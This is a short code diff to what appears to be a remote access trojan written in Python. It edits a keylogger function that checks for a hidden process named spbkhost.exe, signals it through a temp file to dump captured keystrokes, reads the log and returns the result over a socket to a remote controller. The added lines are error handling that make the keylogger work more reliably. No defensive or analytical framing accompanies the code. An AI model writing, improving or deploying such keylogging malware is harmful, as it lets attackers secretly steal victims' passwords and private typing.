@@ -317,6 +317,9 @@ def keylogger(option):
         if not b"spbkhost.exe" in command:  # check if keylogger is running
             objSocket.send(str.encode("error"))
             return
+        elif not os.path.isfile(TMP + "/spbky.txt"):
+            objSocket.send(str.encode("error2"))
+            return
 
         objSettings = open(TMP + "/spbky.txt", "w")
         objSettings.write("dump")  # give signal to dump
@@ -325,6 +328,10 @@ def keylogger(option):
         time.sleep(2)
         objTxtFile = open(TMP + "/spblog.txt", "r")  # read logs
         strLogs = objTxtFile.read()
+
+        if strLogs == "":
+            strLogs = "No logs"
+
         objTxtFile.close()
 
         time.sleep(0.2)
